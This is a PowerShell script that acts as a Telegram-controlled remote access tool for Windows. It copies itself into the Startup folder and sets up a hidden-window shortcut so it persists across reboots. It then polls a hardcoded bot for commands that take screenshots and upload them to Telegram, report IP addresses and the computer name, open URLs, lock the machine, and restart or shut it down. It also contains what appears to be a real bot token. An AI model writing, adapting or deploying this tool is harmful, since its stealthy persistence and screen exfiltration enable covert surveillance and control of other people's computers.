# Telegram-Controlled PowerShell Script
# Commands: /open_notepad, /visit <url>, /lock, /restart, /shutdown, /get_ip, /screenshot
$botToken = "7462575551:AAG66o16VhlQu_26sfPaEpIxvhRWKeHBh04"
$userId = "5036966807"
$apiUrl = "https://api.telegram.org/bot$botToken"
$lastUpdateId = 0

# Function to send a message via Telegram Bot
function Send-TelegramMessage {
    param (
        [string]$chatId,
        [string]$message
    )
    Invoke-RestMethod "$apiUrl/sendMessage" -Method Post -ContentType "application/json" -Body (@{
        chat_id = $chatId
        text = $message
    } | ConvertTo-Json -Depth 10)
}

# Function to get the system's local IP address
function Get-LocalIP {
    $ipInfo = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.PrefixLength -eq 24}
    return $ipInfo.IPAddress -join ' '
}

# Function to get the public IP address
function Get-PublicIP {
    try {
        $publicIP = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -Method Get
        return $publicIP.ip
    } catch {
        return "Unable to retrieve public IP."
    }
}

# Function to take and send screenshot
function Send-Screenshot {
    param (
        [string]$chatId
    )
    try {
        # Create temp file for screenshot
        $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        
        # Load required assemblies
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        # Capture screenshot
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
        
        # Save screenshot
        $bitmap.Save($screenshotPath)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        # Send screenshot via Telegram
        $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
        $fileContentBase64 = [Convert]::ToBase64String($fileContent)
        
        $boundary = [Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"$LF",
            "$chatId",
            "--$boundary",
            "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
            "Content-Type: image/png$LF",
            [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileContent),
            "--$boundary--$LF"
        ) -join $LF
        
        Invoke-RestMethod -Uri "$apiUrl/sendPhoto" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
        
        # Clean up
        Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
        return $true
    }
    catch {
        return $false
    }
}

function Get-PCName {
    return $env:COMPUTERNAME
}
# Notify when the system is running
Send-TelegramMessage -chatId $userId -message "System is running"

# Get script's full path
$scriptPath = $MyInvocation.MyCommand.Path
$scriptName = [System.IO.Path]::GetFileName($scriptPath)
$startupFolder = [System.Environment]::GetFolderPath('Startup')
$destinationPath = Join-Path $startupFolder $scriptName

# If script is not already in Startup folder, copy it there
if (-not (Test-Path $destinationPath)) {
    Copy-Item -Path $scriptPath -Destination $destinationPath
    Write-Host "Script placed in Startup folder."
}

# Create a shortcut to run the script in hidden mode
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut([System.IO.Path]::Combine($startupFolder, "$scriptName.lnk"))
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-WindowStyle Hidden -File `"$destinationPath`""
$shortcut.Save()

while ($true) {
    try {
        $updates = Invoke-RestMethod "$apiUrl/getUpdates?offset=$($lastUpdateId + 1)&timeout=10"
        foreach ($update in $updates.result) {
            $lastUpdateId = $update.update_id
            $chatId = $update.message.chat.id
            $text = $update.message.text.Trim()  # Added Trim() to remove whitespace
            
            if ($chatId -ne $userId) { continue }
            
            # Default reply
            $reply = "Unknown command."
            
            # Command processing - improved matching
            if ($text -eq "/get_ip") {
                $localIP = Get-LocalIP
                $publicIP = Get-PublicIP
                $reply = "Local IP address: $localIP`nPublic IP address: $publicIP"
            }
			
			elseif ($text -eq "/get_pcname") {  # New command
			$pcName = Get-PCName
			$reply = "Computer Name: $pcName"
			}
            elseif ($text -eq "/open_notepad") {
                Start-Process notepad.exe
                $reply = "Notepad opened."
            }
            elseif ($text -match "^/visit\s+(http[s]?:\/\/.*)") {
                $url = $matches[1]
                [System.Diagnostics.Process]::Start($url)
                $reply = "Opened in browser: $url"
            }
            elseif ($text -eq "/lock") {
                rundll32.exe user32.dll,LockWorkStation
                $reply = "System locked."
            }
            elseif ($text -eq "/restart") {
                shutdown /r /t 0
                $reply = "Restarting system..."
            }
            elseif ($text -eq "/shutdown") {
                shutdown /s /t 0
                $reply = "Shutting down system..."
            }
            elseif ($text -eq "/screenshot") {
                $reply = "Taking screenshot..."
                Send-TelegramMessage -chatId $chatId -message $reply
                
                $success = Send-Screenshot -chatId $chatId
                if ($success) {
                    $reply = "Screenshot sent."
                } else {
                    $reply = "Failed to capture screenshot."
                }
            }
            
            # Print debugging info
            Write-Host "Received command: '$text'"
            
            # Send the response to the user
            Send-TelegramMessage -chatId $chatId -message $reply
        }
        Start-Sleep -Seconds 2
    } catch {
        Write-Host "Error: $_"
        Start-Sleep -Seconds 5
    }
}
